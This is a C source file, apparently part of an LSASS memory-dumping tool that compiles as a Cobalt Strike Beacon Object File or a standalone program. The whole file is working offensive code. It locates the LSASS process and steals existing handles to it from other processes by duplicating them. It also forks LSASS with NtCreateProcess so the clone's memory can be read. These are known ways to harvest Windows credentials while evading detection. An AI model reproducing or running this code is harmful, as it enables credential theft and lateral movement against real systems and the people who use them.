#include "../include/handle.h"
#include "../include/modules.h"

BOOL is_lsass(HANDLE hProcess)
{
    // if the process has 'lsass.exe' loaded, then we found LSASS
    wchar_t* module_name[] = { L"lsass.exe" };
    Pmodule_info module_list = find_modules(
        hProcess,
        module_name,
        ARRAY_SIZE(module_name),
        FALSE
    );
    if (module_list)
    {
        free_linked_list(module_list); module_list = NULL;
        return TRUE;
    }
    return FALSE;
}

HANDLE find_lsass(void)
{
    // loop over each process
    HANDLE hProcess = NULL;
    while (TRUE)
    {
        NTSTATUS status = NtGetNextProcess(
            hProcess,
            PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
            0,
            0,
            &hProcess
        );
        if (status == STATUS_NO_MORE_ENTRIES)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "The LSASS process was not found.\n"
            );
            return NULL;
        }
        if (!NT_SUCCESS(status))
        {
#ifdef DEBUG
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtGetNextProcess, status: 0x%lx\n",
                status
            );
#endif
            return NULL;
        }
        if (is_lsass(hProcess))
            return hProcess;
    }
}

HANDLE get_process_handle(
    DWORD dwPid,
    DWORD dwFlags,
    BOOL quiet
)
{
    NTSTATUS status;
    HANDLE hProcess = NULL;
    OBJECT_ATTRIBUTES ObjectAttributes;

    InitializeObjectAttributes(
        &ObjectAttributes,
        NULL,
        0,
        NULL,
        NULL
    );
    CLIENT_ID uPid = { 0 };

    uPid.UniqueProcess = (HANDLE)(DWORD_PTR)dwPid;
    uPid.UniqueThread = (HANDLE)0;

    status = NtOpenProcess(
        &hProcess,
        dwFlags,
        &ObjectAttributes,
        &uPid
    );

    if (status == STATUS_INVALID_CID)
    {
        if (!quiet)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "There is no process with the PID %ld.\n",
                dwPid
            );
        }
        return NULL;
    }
    if (status == STATUS_ACCESS_DENIED)
    {
        if (!quiet)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Could not open a handle to %ld\n",
                dwPid
            );
        }
        return NULL;
    }
    else if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
        if (!quiet)
        {
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtOpenProcess, status: 0x%lx\n",
                status
            );
        }
#endif
        return NULL;
    }

    return hProcess;
}

PSYSTEM_HANDLE_INFORMATION get_all_handles(void)
{
    NTSTATUS status;
    ULONG buffer_size = sizeof(SYSTEM_HANDLE_INFORMATION);
    PVOID handleTableInformation = intAlloc(buffer_size);
    if (!handleTableInformation)
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
            buffer_size,
            GetLastError()
        );
#endif
        return NULL;
    }
    while (TRUE)
    {
        //get information of all the existing handles
        status = NtQuerySystemInformation(
            SystemHandleInformation,
            handleTableInformation,
            buffer_size,
            &buffer_size
        );
        if (status == STATUS_INFO_LENGTH_MISMATCH)
        {
            // the buffer was too small, buffer_size now has the new length
            intFree(handleTableInformation); handleTableInformation = NULL;
            handleTableInformation = intAlloc(buffer_size);
            if (!handleTableInformation)
            {
#ifdef DEBUG
#ifdef BOF
                BeaconPrintf(CALLBACK_ERROR,
#else
                printf(
#endif
                    "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
                    buffer_size,
                    GetLastError()
                );
#endif
                return NULL;
            }
            continue;
        }
        if (!NT_SUCCESS(status))
        {
            intFree(handleTableInformation); handleTableInformation = NULL;
#ifdef DEBUG
#ifdef BOF
            BeaconPrintf(CALLBACK_ERROR,
#else
            printf(
#endif
                "Failed to call NtQuerySystemInformation, status: 0x%lx\n",
                status
            );
#endif
            return NULL;
        }
        return handleTableInformation;
    }
}

BOOL process_is_included(
    PPROCESS_LIST process_list,
    ULONG ProcessId
)
{
    for (ULONG i = 0; i < process_list->Count; i++)
    {
        if (process_list->ProcessId[i] == ProcessId)
            return TRUE;
    }
    return FALSE;
}

PPROCESS_LIST get_processes_from_handle_table(
    PSYSTEM_HANDLE_INFORMATION handleTableInformation
)
{
    PPROCESS_LIST process_list = intAlloc(sizeof(PROCESS_LIST));
    if (!process_list)
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%x bytes, error: %ld\n",
            (ULONG32)sizeof(PROCESS_LIST),
            GetLastError()
        );
#endif
        return NULL;
    }

    for (ULONG i = 0; i < handleTableInformation->Count; i++)
    {
        PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[i];

        if (!process_is_included(process_list, handleInfo->ProcessId))
        {
            process_list->ProcessId[process_list->Count++] = handleInfo->ProcessId;
            if (process_list->Count == MAX_PROCESSES)
            {
#ifdef DEBUG
#ifdef BOF
                BeaconPrintf(CALLBACK_ERROR,
#else
                printf(
#endif
                    "Too many processes, please increase MAX_PROCESSES\n"
                );
#endif
                break;
            }
        }
    }
    return process_list;
}

BOOL is_process_handle(
    HANDLE hObject
)
{
    BOOL is_process = FALSE;
    ULONG buffer_size = 0x1000;
    POBJECT_TYPE_INFORMATION ObjectInformation = intAlloc(buffer_size);
    if (!ObjectInformation)
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call HeapAlloc for 0x%lx bytes, error: %ld\n",
            buffer_size,
            GetLastError()
        );
#endif
        return FALSE;
    }

    NTSTATUS status = NtQueryObject(
        hObject,
        ObjectTypeInformation,
        ObjectInformation,
        buffer_size,
        NULL
    );
    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtQueryObject, status: 0x%lx\n",
            status
        );
#endif
        return FALSE;
    }
    if (!_wcsicmp(ObjectInformation->TypeName.Buffer, L"Process"))
        is_process = TRUE;
    intFree(ObjectInformation); ObjectInformation = NULL;
    return is_process;
}

HANDLE duplicate_lsass_handle(
    DWORD lsass_pid
)
{
    NTSTATUS status;

    PSYSTEM_HANDLE_INFORMATION handleTableInformation = get_all_handles();
    if (!handleTableInformation)
        return NULL;

    PPROCESS_LIST process_list = get_processes_from_handle_table(handleTableInformation);
    if (!process_list)
        return NULL;

    DWORD local_pid = (DWORD)READ_MEMLOC(CID_OFFSET);

    // loop over each ProcessId
    for (ULONG i = 0; i < process_list->Count; i++)
    {
        ULONG ProcessId = process_list->ProcessId[i];

        if (ProcessId == local_pid)
            continue;
        if (ProcessId == lsass_pid)
            continue;
        if (ProcessId == 0)
            continue;
        if (ProcessId == 4)
            continue;

        // we will open a handle to this ProcessId later on
        HANDLE hProcess = NULL;

        // loop over each handle of this ProcessId
        for (ULONG j = 0; j < handleTableInformation->Count; j++)
        {
            PSYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (PSYSTEM_HANDLE_TABLE_ENTRY_INFO)&handleTableInformation->Handle[j];

            // make sure this handle is from the current ProcessId
            if (handleInfo->ProcessId != ProcessId)
                continue;

            // make sure the handle has PROCESS_QUERY_INFORMATION and PROCESS_VM_READ
            if ((handleInfo->GrantedAccess & PROCESS_QUERY_INFORMATION) == 0 ||
                (handleInfo->GrantedAccess & PROCESS_VM_READ) == 0)
                continue;

            if (!hProcess)
            {
                // open a handle to the process with PROCESS_DUP_HANDLE
                hProcess = get_process_handle(
                    ProcessId,
                    PROCESS_DUP_HANDLE,
                    TRUE
                );
                if (!hProcess)
                    break;
            }

            // duplicate the handle
            HANDLE hDuped = NULL;
            status = NtDuplicateObject(
                hProcess,
                (HANDLE)(DWORD_PTR)handleInfo->Handle,
                NtCurrentProcess(),
                &hDuped,
                PROCESS_QUERY_INFORMATION|PROCESS_VM_READ,
                0,
                0
            );
            if (!NT_SUCCESS(status))
                continue;

            if (!is_process_handle(hDuped))
            {
                NtClose(hDuped); hDuped = NULL;
                continue;
            }

            if (is_lsass(hDuped))
            {
                // found LSASS handle
#ifdef BOF
                BeaconPrintf(CALLBACK_OUTPUT,
#else
                printf(
#endif
                    "Found LSASS handle: 0x%x, on process: %ld\n",
                    handleInfo->Handle,
                    handleInfo->ProcessId
                );
                intFree(handleTableInformation); handleTableInformation = NULL;
                intFree(process_list); process_list = NULL;
                NtClose(hProcess); hProcess = NULL;
                return hDuped;
            }
            NtClose(hDuped); hDuped = NULL;
        }
        if (hProcess)
        {
            NtClose(hProcess); hProcess = NULL;
        }
    }

#ifdef BOF
    BeaconPrintf(CALLBACK_ERROR,
#else
    printf(
#endif
        "No handle to the LSASS process was found\n"
    );

    intFree(handleTableInformation); handleTableInformation = NULL;
    intFree(process_list); process_list = NULL;
    return NULL;
}

HANDLE fork_lsass_process(
    DWORD dwPid
)
{
    // open handle to LSASS with PROCESS_CREATE_PROCESS
    HANDLE hProcess = get_process_handle(
        dwPid,
        PROCESS_CREATE_PROCESS,
        FALSE
    );
    if (!hProcess)
        return NULL;

    // fork the LSASS process
    HANDLE hCloneProcess = NULL;
    OBJECT_ATTRIBUTES CloneObjectAttributes;

    InitializeObjectAttributes(
        &CloneObjectAttributes,
        NULL,
        OBJ_CASE_INSENSITIVE,
        NULL,
        NULL
    );

    NTSTATUS status = NtCreateProcess(
        &hCloneProcess,
        GENERIC_ALL,
        &CloneObjectAttributes,
        hProcess,
        TRUE,
        NULL,
        NULL,
        NULL
    );
    NtClose(hProcess); hProcess = NULL;

    if (!NT_SUCCESS(status))
    {
#ifdef DEBUG
#ifdef BOF
        BeaconPrintf(CALLBACK_ERROR,
#else
        printf(
#endif
            "Failed to call NtCreateProcess, status: 0x%lx\n",
            status
        );
#endif
        return NULL;
    }

    return hCloneProcess;
}
